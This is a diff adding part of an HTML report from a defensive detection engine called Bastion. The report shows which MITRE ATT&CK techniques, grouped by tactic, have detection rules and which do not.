+      <span class="chip ok" title="Scheduled Task/Job: 5 rule(s)">T1053</span>
+      <span class="chip ok" title="At: 2 rule(s)">T1053.002</span>
+      <span class="chip ok" title="Scheduled Task: 31 rule(s)">T1053.005</span>
+      <span class="chip ok" title="Process Injection: 24 rule(s)">T1055</span>
+      <span class="chip ok" title="Dynamic-link Library Injection: 6 rule(s)">T1055.001</span>
+      <span class="chip ok" title="Thread Execution Hijacking: 2 rule(s)">T1055.003</span>
+      <span class="chip ok" title="Extra Window Memory Injection: 1 rule(s)">T1055.011</span>
+      <span class="chip ok" title="Process Hollowing: 4 rule(s)">T1055.012</span>
+      <span class="chip ok" title="Exploitation for Privilege Escalation: 10 rule(s)">T1068</span>
+      <span class="chip ok" title="Valid Accounts: 9 rule(s)">T1078</span>
+      <span class="chip ok" title="Default Accounts: 1 rule(s)">T1078.001</span>
+      <span class="chip ok" title="Domain Accounts: 4 rule(s)">T1078.002</span>
+      <span class="chip ok" title="Local Accounts: 1 rule(s)">T1078.003</span>
+      <span class="chip ok" title="Account Manipulation: 16 rule(s)">T1098</span>
+      <span class="chip ok" title="Access Token Manipulation: 2 rule(s)">T1134</span>
+      <span class="chip ok" title="Token Impersonation/Theft: 9 rule(s)">T1134.001</span>
+      <span class="chip ok" title="Create Process with Token: 6 rule(s)">T1134.002</span>
+      <span class="chip ok" title="Make and Impersonate Token: 3 rule(s)">T1134.003</span>
+      <span class="chip ok" title="Parent PID Spoofing: 1 rule(s)">T1134.004</span>
+      <span class="chip ok" title="SID-History Injection: 1 rule(s)">T1134.005</span>
+      <span class="chip ok" title="Group Policy Modification: 6 rule(s)">T1484.001</span>
+      <span class="chip ok" title="Create or Modify System Process: 9 rule(s)">T1543</span>
+      <span class="chip ok" title="Windows Service: 37 rule(s)">T1543.003</span>
+      <span class="chip ok" title="Event Triggered Execution: 7 rule(s)">T1546</span>
+      <span class="chip ok" title="Change Default File Association: 5 rule(s)">T1546.001</span>
+      <span class="chip ok" title="Screensaver: 4 rule(s)">T1546.002</span>
+      <span class="chip ok" title="Windows Management Instrumentation Event Subscription: 11 rule(s)">T1546.003</span>
+      <span class="chip ok" title="Netsh Helper DLL: 4 rule(s)">T1546.007</span>
+      <span class="chip ok" title="Accessibility Features: 6 rule(s)">T1546.008</span>
+      <span class="chip ok" title="AppCert DLLs: 2 rule(s)">T1546.009</span>
+      <span class="chip ok" title="AppInit DLLs: 1 rule(s)">T1546.010</span>
+      <span class="chip ok" title="Application Shimming: 6 rule(s)">T1546.011</span>
+      <span class="chip ok" title="Image File Execution Options Injection: 2 rule(s)">T1546.012</span>
+      <span class="chip ok" title="PowerShell Profile: 3 rule(s)">T1546.013</span>
+      <span class="chip ok" title="Component Object Model Hijacking: 8 rule(s)">T1546.015</span>
+      <span class="chip ok" title="Boot or Logon Autostart Execution: 7 rule(s)">T1547</span>
+      <span class="chip ok" title="Registry Run Keys / Startup Folder: 31 rule(s)">T1547.001</span>
+      <span class="chip ok" title="Authentication Package: 1 rule(s)">T1547.002</span>
+      <span class="chip ok" title="Time Providers: 1 rule(s)">T1547.003</span>
+      <span class="chip ok" title="Winlogon Helper DLL: 2 rule(s)">T1547.004</span>
+      <span class="chip ok" title="Security Support Provider: 1 rule(s)">T1547.005</span>
+      <span class="chip ok" title="LSASS Driver: 1 rule(s)">T1547.008</span>
+      <span class="chip ok" title="Shortcut Modification: 4 rule(s)">T1547.009</span>
+      <span class="chip ok" title="Port Monitors: 4 rule(s)">T1547.010</span>
+      <span class="chip ok" title="Active Setup: 1 rule(s)">T1547.014</span>
+      <span class="chip ok" title="Login Items: 1 rule(s)">T1547.015</span>
+      <span class="chip ok" title="Abuse Elevation Control Mechanism: 8 rule(s)">T1548</span>
+      <span class="chip ok" title="Bypass User Account Control: 56 rule(s)">T1548.002</span>
+      <span class="chip miss" title="Boot or Logon Initialization Scripts: no rules">T1037</span>
+      <span class="chip miss" title="Login Hook: no rules">T1037.002</span>
+      <span class="chip miss" title="Network Logon Script: no rules">T1037.003</span>
+      <span class="chip miss" title="RC Scripts: no rules">T1037.004</span>
+      <span class="chip miss" title="Startup Items: no rules">T1037.005</span>
+      <span class="chip miss" title="Cron: no rules">T1053.003</span>
+      <span class="chip miss" title="Systemd Timers: no rules">T1053.006</span>
+      <span class="chip miss" title="Container Orchestration Job: no rules">T1053.007</span>
+      <span class="chip miss" title="Portable Executable Injection: no rules">T1055.002</span>
+      <span class="chip miss" title="Asynchronous Procedure Call: no rules">T1055.004</span>
+      <span class="chip miss" title="Thread Local Storage: no rules">T1055.005</span>
+      <span class="chip miss" title="Ptrace System Calls: no rules">T1055.008</span>
+      <span class="chip miss" title="Proc Memory: no rules">T1055.009</span>
+      <span class="chip miss" title="Process Doppelgänging: no rules">T1055.013</span>
+      <span class="chip miss" title="VDSO Hijacking: no rules">T1055.014</span>
+      <span class="chip miss" title="ListPlanting: no rules">T1055.015</span>
+      <span class="chip miss" title="Cloud Accounts: no rules">T1078.004</span>
+      <span class="chip miss" title="Additional Cloud Credentials: no rules">T1098.001</span>
+      <span class="chip miss" title="Additional Email Delegate Permissions: no rules">T1098.002</span>
+      <span class="chip miss" title="Additional Cloud Roles: no rules">T1098.003</span>
+      <span class="chip miss" title="SSH Authorized Keys: no rules">T1098.004</span>
+      <span class="chip miss" title="Device Registration: no rules">T1098.005</span>
+      <span class="chip miss" title="Additional Container Cluster Roles: no rules">T1098.006</span>
+      <span class="chip miss" title="Additional Local or Domain Groups: no rules">T1098.007</span>
+      <span class="chip miss" title="Domain or Tenant Policy Modification: no rules">T1484</span>
+      <span class="chip miss" title="Trust Modification: no rules">T1484.002</span>
+      <span class="chip miss" title="Launch Agent: no rules">T1543.001</span>
+      <span class="chip miss" title="Systemd Service: no rules">T1543.002</span>
+      <span class="chip miss" title="Launch Daemon: no rules">T1543.004</span>
+      <span class="chip miss" title="Container Service: no rules">T1543.005</span>
+      <span class="chip miss" title="Unix Shell Configuration Modification: no rules">T1546.004</span>
+      <span class="chip miss" title="Trap: no rules">T1546.005</span>
+      <span class="chip miss" title="LC_LOAD_DYLIB Addition: no rules">T1546.006</span>
+      <span class="chip miss" title="Emond: no rules">T1546.014</span>
+      <span class="chip miss" title="Installer Packages: no rules">T1546.016</span>
+      <span class="chip miss" title="Udev Rules: no rules">T1546.017</span>
+      <span class="chip miss" title="Python Startup Hooks: no rules">T1546.018</span>
+      <span class="chip miss" title="Kernel Modules and Extensions: no rules">T1547.006</span>
+      <span class="chip miss" title="Re-opened Applications: no rules">T1547.007</span>
+      <span class="chip miss" title="Print Processors: no rules">T1547.012</span>
+      <span class="chip miss" title="XDG Autostart Entries: no rules">T1547.013</span>
+      <span class="chip miss" title="Setuid and Setgid: no rules">T1548.001</span>
+      <span class="chip miss" title="Sudo and Sudo Caching: no rules">T1548.003</span>
+      <span class="chip miss" title="Elevated Execution with Prompt: no rules">T1548.004</span>
+      <span class="chip miss" title="Temporary Elevated Cloud Access: no rules">T1548.005</span>
+      <span class="chip miss" title="TCC Manipulation: no rules">T1548.006</span>
+      <span class="chip miss" title="Escape to Host: no rules">T1611</span>
+    </div>
+    <h3>reconnaissance</h3>
+    <div class="chips">
+      <span class="chip ok" title="Email Addresses: 1 rule(s)">T1589.002</span>
+      <span class="chip ok" title="Gather Victim Network Information: 2 rule(s)">T1590</span>
+      <span class="chip ok" title="Domain Properties: 1 rule(s)">T1590.001</span>
+      <span class="chip ok" title="DNS: 1 rule(s)">T1590.002</span>
+      <span class="chip ok" title="Code Repositories: 1 rule(s)">T1593.003</span>
+      <span class="chip ok" title="Active Scanning: 3 rule(s)">T1595</span>
+      <span class="chip ok" title="Vulnerability Scanning: 1 rule(s)">T1595.002</span>
+      <span class="chip miss" title="Gather Victim Identity Information: no rules">T1589</span>
+      <span class="chip miss" title="Credentials: no rules">T1589.001</span>
+      <span class="chip miss" title="Employee Names: no rules">T1589.003</span>
+      <span class="chip miss" title="Network Trust Dependencies: no rules">T1590.003</span>
+      <span class="chip miss" title="Network Topology: no rules">T1590.004</span>
+      <span class="chip miss" title="IP Addresses: no rules">T1590.005</span>
+      <span class="chip miss" title="Network Security Appliances: no rules">T1590.006</span>
+      <span class="chip miss" title="Gather Victim Org Information: no rules">T1591</span>
+      <span class="chip miss" title="Determine Physical Locations: no rules">T1591.001</span>
+      <span class="chip miss" title="Business Relationships: no rules">T1591.002</span>
+      <span class="chip miss" title="Identify Business Tempo: no rules">T1591.003</span>
+      <span class="chip miss" title="Identify Roles: no rules">T1591.004</span>
+      <span class="chip miss" title="Gather Victim Host Information: no rules">T1592</span>
+      <span class="chip miss" title="Hardware: no rules">T1592.001</span>
+      <span class="chip miss" title="Software: no rules">T1592.002</span>
+      <span class="chip miss" title="Firmware: no rules">T1592.003</span>
+      <span class="chip miss" title="Client Configurations: no rules">T1592.004</span>
+      <span class="chip miss" title="Search Open Websites/Domains: no rules">T1593</span>
+      <span class="chip miss" title="Social Media: no rules">T1593.001</span>
+      <span class="chip miss" title="Search Engines: no rules">T1593.002</span>
+      <span class="chip miss" title="Search Victim-Owned Websites: no rules">T1594</span>
+      <span class="chip miss" title="Scanning IP Blocks: no rules">T1595.001</span>
+      <span class="chip miss" title="Wordlist Scanning: no rules">T1595.003</span>
+      <span class="chip miss" title="Search Open Technical Databases: no rules">T1596</span>
+      <span class="chip miss" title="DNS/Passive DNS: no rules">T1596.001</span>
+      <span class="chip miss" title="WHOIS: no rules">T1596.002</span>
+      <span class="chip miss" title="Digital Certificates: no rules">T1596.003</span>
+      <span class="chip miss" title="CDNs: no rules">T1596.004</span>
+      <span class="chip miss" title="Scan Databases: no rules">T1596.005</span>
+      <span class="chip miss" title="Search Closed Sources: no rules">T1597</span>
+      <span class="chip miss" title="Threat Intel Vendors: no rules">T1597.001</span>
+      <span class="chip miss" title="Purchase Technical Data: no rules">T1597.002</span>
+      <span class="chip miss" title="Phishing for Information: no rules">T1598</span>
+      <span class="chip miss" title="Spearphishing Service: no rules">T1598.001</span>
+      <span class="chip miss" title="Spearphishing Attachment: no rules">T1598.002</span>
+      <span class="chip miss" title="Spearphishing Link: no rules">T1598.003</span>
+      <span class="chip miss" title="Spearphishing Voice: no rules">T1598.004</span>
+      <span class="chip miss" title="Search Threat Vendor Data: no rules">T1681</span>
+      <span class="chip miss" title="Query Public AI Services: no rules">T1682</span>
+    </div>
+    <h3>resource-development</h3>
+    <div class="chips">
+      <span class="chip ok" title="Compromise Infrastructure: 2 rule(s)">T1584</span>
+      <span class="chip ok" title="Develop Capabilities: 1 rule(s)">T1587</span>
+      <span class="chip ok" title="Malware: 7 rule(s)">T1587.001</span>
+      <span class="chip ok" title="Obtain Capabilities: 2 rule(s)">T1588</span>
+      <span class="chip ok" title="Tool: 9 rule(s)">T1588.002</span>
+      <span class="chip ok" title="Stage Capabilities: 2 rule(s)">T1608</span>
+      <span class="chip miss" title="Acquire Infrastructure: no rules">T1583</span>
+      <span class="chip miss" title="Domains: no rules">T1583.001</span>
+      <span class="chip miss" title="DNS Server: no rules">T1583.002</span>
+      <span class="chip miss" title="Virtual Private Server: no rules">T1583.003</span>
+      <span class="chip miss" title="Server: no rules">T1583.004</span>
+      <span class="chip miss" title="Botnet: no rules">T1583.005</span>
+      <span class="chip miss" title="Web Services: no rules">T1583.006</span>
+      <span class="chip miss" title="Serverless: no rules">T1583.007</span>
+      <span class="chip miss" title="Malvertising: no rules">T1583.008</span>
+      <span class="chip miss" title="Domains: no rules">T1584.001</span>
+      <span class="chip miss" title="DNS Server: no rules">T1584.002</span>
+      <span class="chip miss" title="Virtual Private Server: no rules">T1584.003</span>
+      <span class="chip miss" title="Server: no rules">T1584.004</span>
+      <span class="chip miss" title="Botnet: no rules">T1584.005</span>
+      <span class="chip miss" title="Web Services: no rules">T1584.006</span>
+      <span class="chip miss" title="Serverless: no rules">T1584.007</span>
+      <span class="chip miss" title="Network Devices: no rules">T1584.008</span>
+      <span class="chip miss" title="Establish Accounts: no rules">T1585</span>
+      <span class="chip miss" title="Social Media Accounts: no rules">T1585.001</span>
+      <span class="chip miss" title="Email Accounts: no rules">T1585.002</span>
+      <span class="chip miss" title="Cloud Accounts: no rules">T1585.003</span>
+      <span class="chip miss" title="Compromise Accounts: no rules">T1586</span>
+      <span class="chip miss" title="Social Media Accounts: no rules">T1586.001</span>
+      <span class="chip miss" title="Email Accounts: no rules">T1586.002</span>
+      <span class="chip miss" title="Cloud Accounts: no rules">T1586.003</span>
+      <span class="chip miss" title="Code Signing Certificates: no rules">T1587.002</span>
+      <span class="chip miss" title="Digital Certificates: no rules">T1587.003</span>
+      <span class="chip miss" title="Exploits: no rules">T1587.004</span>
+      <span class="chip miss" title="Malware: no rules">T1588.001</span>
+      <span class="chip miss" title="Code Signing Certificates: no rules">T1588.003</span>
+      <span class="chip miss" title="Digital Certificates: no rules">T1588.004</span>
+      <span class="chip miss" title="Exploits: no rules">T1588.005</span>
+      <span class="chip miss" title="Vulnerabilities: no rules">T1588.006</span>
+      <span class="chip miss" title="Artificial Intelligence: no rules">T1588.007</span>
+      <span class="chip miss" title="Upload Malware: no rules">T1608.001</span>
+      <span class="chip miss" title="Upload Tool: no rules">T1608.002</span>
+      <span class="chip miss" title="Install Digital Certificate: no rules">T1608.003</span>
+      <span class="chip miss" title="Drive-by Target: no rules">T1608.004</span>
+      <span class="chip miss" title="Link Target: no rules">T1608.005</span>
+      <span class="chip miss" title="SEO Poisoning: no rules">T1608.006</span>
+      <span class="chip miss" title="Acquire Access: no rules">T1650</span>
+      <span class="chip miss" title="Generate Content: no rules">T1683</span>
+      <span class="chip miss" title="Written Content: no rules">T1683.001</span>
+      <span class="chip miss" title="Audio-Visual Content: no rules">T1683.002</span>
+    </div>
+    <h3>stealth</h3>
+    <div class="chips">
+      <span class="chip ok" title="Direct Volume Access: 1 rule(s)">T1006</span>
+      <span class="chip ok" title="Obfuscated Files or Information: 84 rule(s)">T1027</span>
+      <span class="chip ok" title="Binary Padding: 1 rule(s)">T1027.001</span>
+      <span class="chip ok" title="Software Packing: 1 rule(s)">T1027.002</span>
+      <span class="chip ok" title="Steganography: 1 rule(s)">T1027.003</span>
+      <span class="chip ok" title="Compile After Delivery: 5 rule(s)">T1027.004</span>
+      <span class="chip ok" title="Indicator Removal from Tools: 4 rule(s)">T1027.005</span>
+      <span class="chip ok" title="Embedded Payloads: 1 rule(s)">T1027.009</span>
+      <span class="chip ok" title="Command Obfuscation: 7 rule(s)">T1027.010</span>
+      <span class="chip ok" title="Masquerading: 36 rule(s)">T1036</span>
+      <span class="chip ok" title="Right-to-Left Override: 3 rule(s)">T1036.002</span>
+      <span class="chip ok" title="Rename Legitimate Utilities: 24 rule(s)">T1036.003</span>
+      <span class="chip ok" title="Masquerade Task or Service: 1 rule(s)">T1036.004</span>
+      <span class="chip ok" title="Match Legitimate Resource Name or Location: 13 rule(s)">T1036.005</span>
+      <span class="chip ok" title="Double File Extension: 3 rule(s)">T1036.007</span>
+      <span class="chip ok" title="Process Injection: 24 rule(s)">T1055</span>
+      <span class="chip ok" title="Dynamic-link Library Injection: 6 rule(s)">T1055.001</span>
+      <span class="chip ok" title="Thread Execution Hijacking: 2 rule(s)">T1055.003</span>
+      <span class="chip ok" title="Extra Window Memory Injection: 1 rule(s)">T1055.011</span>
+      <span class="chip ok" title="Process Hollowing: 4 rule(s)">T1055.012</span>
+      <span class="chip ok" title="Indicator Removal: 17 rule(s)">T1070</span>
+      <span class="chip ok" title="Clear Command History: 7 rule(s)">T1070.003</span>
+      <span class="chip ok" title="File Deletion: 11 rule(s)">T1070.004</span>
+      <span class="chip ok" title="Network Share Connection Removal: 4 rule(s)">T1070.005</span>
+      <span class="chip ok" title="Timestomp: 2 rule(s)">T1070.006</span>
+      <span class="chip ok" title="Valid Accounts: 9 rule(s)">T1078</span>
+      <span class="chip ok" title="Default Accounts: 1 rule(s)">T1078.001</span>
+      <span class="chip ok" title="Domain Accounts: 4 rule(s)">T1078.002</span>
+      <span class="chip ok" title="Local Accounts: 1 rule(s)">T1078.003</span>
+      <span class="chip ok" title="Trusted Developer Utilities Proxy Execution: 19 rule(s)">T1127</span>
+      <span class="chip ok" title="MSBuild: 1 rule(s)">T1127.001</span>
+      <span class="chip ok" title="Access Token Manipulation: 2 rule(s)">T1134</span>
+      <span class="chip ok" title="Token Impersonation/Theft: 9 rule(s)">T1134.001</span>
+      <span class="chip ok" title="Create Process with Token: 6 rule(s)">T1134.002</span>
+      <span class="chip ok" title="Make and Impersonate Token: 3 rule(s)">T1134.003</span>
+      <span class="chip ok" title="Parent PID Spoofing: 1 rule(s)">T1134.004</span>
+      <span class="chip ok" title="SID-History Injection: 1 rule(s)">T1134.005</span>
+      <span class="chip ok" title="Deobfuscate/Decode Files or Information: 8 rule(s)">T1140</span>
+      <span class="chip ok" title="BITS Jobs: 15 rule(s)">T1197</span>
+      <span class="chip ok" title="Indirect Command Execution: 39 rule(s)">T1202</span>
+      <span class="chip ok" title="Exploitation for Stealth: 4 rule(s)">T1211</span>
+      <span class="chip ok" title="System Script Proxy Execution: 13 rule(s)">T1216</span>
+      <span class="chip ok" title="PubPrn: 2 rule(s)">T1216.001</span>
+      <span class="chip ok" title="System Binary Proxy Execution: 134 rule(s)">T1218</span>
+      <span class="chip ok" title="Compiled HTML File: 5 rule(s)">T1218.001</span>
+      <span class="chip ok" title="Control Panel: 1 rule(s)">T1218.002</span>
+      <span class="chip ok" title="CMSTP: 7 rule(s)">T1218.003</span>
+      <span class="chip ok" title="Mshta: 7 rule(s)">T1218.005</span>
+      <span class="chip ok" title="Msiexec: 9 rule(s)">T1218.007</span>
+      <span class="chip ok" title="Odbcconf: 8 rule(s)">T1218.008</span>
+      <span class="chip ok" title="Regsvcs/Regasm: 4 rule(s)">T1218.009</span>
+      <span class="chip ok" title="Regsvr32: 17 rule(s)">T1218.010</span>
+      <span class="chip ok" title="Rundll32: 27 rule(s)">T1218.011</span>
+      <span class="chip ok" title="Mavinject: 2 rule(s)">T1218.013</span>
+      <span class="chip ok" title="MMC: 2 rule(s)">T1218.014</span>
+      <span class="chip ok" title="XSL Script Processing: 5 rule(s)">T1220</span>
+      <span class="chip ok" title="Template Injection: 1 rule(s)">T1221</span>
+      <span class="chip ok" title="System Checks: 1 rule(s)">T1497.001</span>
+      <span class="chip ok" title="System Firmware: 2 rule(s)">T1542.001</span>
+      <span class="chip ok" title="Bootkit: 1 rule(s)">T1542.003</span>
+      <span class="chip ok" title="Hide Artifacts: 9 rule(s)">T1564</span>
+      <span class="chip ok" title="Hidden Files and Directories: 6 rule(s)">T1564.001</span>
+      <span class="chip ok" title="Hidden Users: 3 rule(s)">T1564.002</span>
+      <span class="chip ok" title="Hidden Window: 8 rule(s)">T1564.003</span>
+      <span class="chip ok" title="NTFS File Attributes: 21 rule(s)">T1564.004</span>
+      <span class="chip ok" title="Run Virtual Instance: 2 rule(s)">T1564.006</span>
+      <span class="chip ok" title="Hijack Execution Flow: 5 rule(s)">T1574</span>
+      <span class="chip ok" title="DLL: 79 rule(s)">T1574.001</span>
+      <span class="chip ok" title="Executable Installer File Permissions Weakness: 2 rule(s)">T1574.005</span>
+      <span class="chip ok" title="Path Interception by PATH Environment Variable: 2 rule(s)">T1574.007</span>
+      <span class="chip ok" title="Path Interception by Search Order Hijacking: 1 rule(s)">T1574.008</span>
+      <span class="chip ok" title="Services Registry Permissions Weakness: 11 rule(s)">T1574.011</span>
+      <span class="chip ok" title="COR_PROFILER: 2 rule(s)">T1574.012</span>
+      <span class="chip ok" title="Reflective Code Loading: 2 rule(s)">T1620</span>
+      <span class="chip ok" title="Debugger Evasion: 1 rule(s)">T1622</span>
+      <span class="chip miss" title="Rootkit: no rules">T1014</span>
+      <span class="chip miss" title="HTML Smuggling: no rules">T1027.006</span>
+      <span class="chip miss" title="Dynamic API Resolution: no rules">T1027.007</span>
+      <span class="chip miss" title="Stripped Payloads: no rules">T1027.008</span>
+      <span class="chip miss" title="Fileless Storage: no rules">T1027.011</span>
+      <span class="chip miss" title="LNK Icon Smuggling: no rules">T1027.012</span>
+      <span class="chip miss" title="Encrypted/Encoded File: no rules">T1027.013</span>
+      <span class="chip miss" title="Polymorphic Code: no rules">T1027.014</span>
+      <span class="chip miss" title="Compression: no rules">T1027.015</span>
+      <span class="chip miss" title="Junk Code Insertion: no rules">T1027.016</span>
+      <span class="chip miss" title="SVG Smuggling: no rules">T1027.017</span>
+      <span class="chip miss" title="Invisible Unicode: no rules">T1027.018</span>
+      <span class="chip miss" title="Invalid Code Signature: no rules">T1036.001</span>
+      <span class="chip miss" title="Space after Filename: no rules">T1036.006</span>
+      <span class="chip miss" title="Masquerade File Type: no rules">T1036.008</span>
+      <span class="chip miss" title="Break Process Trees: no rules">T1036.009</span>
+      <span class="chip miss" title="Masquerade Account Name: no rules">T1036.010</span>
+      <span class="chip miss" title="Overwrite Process Arguments: no rules">T1036.011</span>
+      <span class="chip miss" title="Browser Fingerprint: no rules">T1036.012</span>
+      <span class="chip miss" title="Portable Executable Injection: no rules">T1055.002</span>
+      <span class="chip miss" title="Asynchronous Procedure Call: no rules">T1055.004</span>
+      <span class="chip miss" title="Thread Local Storage: no rules">T1055.005</span>
+      <span class="chip miss" title="Ptrace System Calls: no rules">T1055.008</span>
+      <span class="chip miss" title="Proc Memory: no rules">T1055.009</span>
+      <span class="chip miss" title="Process Doppelgänging: no rules">T1055.013</span>
+      <span class="chip miss" title="VDSO Hijacking: no rules">T1055.014</span>
+      <span class="chip miss" title="ListPlanting: no rules">T1055.015</span>
+      <span class="chip miss" title="Clear Network Connection History and Configurations: no rules">T1070.007</span>
+      <span class="chip miss" title="Clear Mailbox Data: no rules">T1070.008</span>
+      <span class="chip miss" title="Clear Persistence: no rules">T1070.009</span>
+      <span class="chip miss" title="Relocate Malware: no rules">T1070.010</span>
+      <span class="chip miss" title="Cloud Accounts: no rules">T1078.004</span>
+      <span class="chip miss" title="ClickOnce: no rules">T1127.002</span>
+      <span class="chip miss" title="JamPlus: no rules">T1127.003</span>
+      <span class="chip miss" title="Traffic Signaling: no rules">T1205</span>
+      <span class="chip miss" title="Port Knocking: no rules">T1205.001</span>
+      <span class="chip miss" title="Socket Filters: no rules">T1205.002</span>
+      <span class="chip miss" title="SyncAppvPublishingServer: no rules">T1216.002</span>
+      <span class="chip miss" title="InstallUtil: no rules">T1218.004</span>
+      <span class="chip miss" title="Verclsid: no rules">T1218.012</span>
+      <span class="chip miss" title="Electron Applications: no rules">T1218.015</span>
+      <span class="chip miss" title="Execution Guardrails: no rules">T1480</span>
+      <span class="chip miss" title="Environmental Keying: no rules">T1480.001</span>
+      <span class="chip miss" title="Mutual Exclusion: no rules">T1480.002</span>
+      <span class="chip miss" title="Virtualization/Sandbox Evasion: no rules">T1497</span>
+      <span class="chip miss" title="User Activity Based Checks: no rules">T1497.002</span>
+      <span class="chip miss" title="Time Based Checks: no rules">T1497.003</span>
+      <span class="chip miss" title="Unused/Unsupported Cloud Regions: no rules">T1535</span>
+      <span class="chip miss" title="Pre-OS Boot: no rules">T1542</span>
+      <span class="chip miss" title="Component Firmware: no rules">T1542.002</span>
+      <span class="chip miss" title="ROMMONkit: no rules">T1542.004</span>
+      <span class="chip miss" title="TFTP Boot: no rules">T1542.005</span>
+      <span class="chip miss" title="Hidden File System: no rules">T1564.005</span>
+      <span class="chip miss" title="VBA Stomping: no rules">T1564.007</span>
+      <span class="chip miss" title="Email Hiding Rules: no rules">T1564.008</span>
+      <span class="chip miss" title="Resource Forking: no rules">T1564.009</span>
+      <span class="chip miss" title="Process Argument Spoofing: no rules">T1564.010</span>
+      <span class="chip miss" title="Ignore Process Interrupts: no rules">T1564.011</span>
+      <span class="chip miss" title="File/Path Exclusions: no rules">T1564.012</span>
+      <span class="chip miss" title="Bind Mounts: no rules">T1564.013</span>
+      <span class="chip miss" title="Extended Attributes: no rules">T1564.014</span>
+      <span class="chip miss" title="Dylib Hijacking: no rules">T1574.004</span>
+      <span class="chip miss" title="Dynamic Linker Hijacking: no rules">T1574.006</span>
+      <span class="chip miss" title="Path Interception by Unquoted Path: no rules">T1574.009</span>
+      <span class="chip miss" title="Services File Permissions Weakness: no rules">T1574.010</span>
+      <span class="chip miss" title="KernelCallbackTable: no rules">T1574.013</span>
+      <span class="chip miss" title="AppDomainManager: no rules">T1574.014</span>
+      <span class="chip miss" title="Build Image on Host: no rules">T1612</span>
+      <span class="chip miss" title="Delay Execution: no rules">T1678</span>
+      <span class="chip miss" title="Selective Exclusion: no rules">T1679</span>
+      <span class="chip miss" title="Social Engineering: no rules">T1684</span>
+      <span class="chip miss" title="Impersonation: no rules">T1684.001</span>
+      <span class="chip miss" title="Email Spoofing: no rules">T1684.002</span>
+    </div>
+  </details>
+
+  <h2>Rule tags not in this ATT&amp;CK release</h2>
+  <p class="sub">T1070.001, T1562, T1562.001, T1562.002, T1562.004, T1562.006, T1562.010. Deprecated or unknown in the
+  loaded bundle; excluded from the coverage counts.</p>
+
+  <div class="footer">
+    Generated by Bastion, a defensive detection engine. It reads logs you own and recognizes
+    traces of known techniques; it never attacks anything. This page is self-contained and makes
+    no network requests.
+  </div>
+</div>
+</body>
+</html>
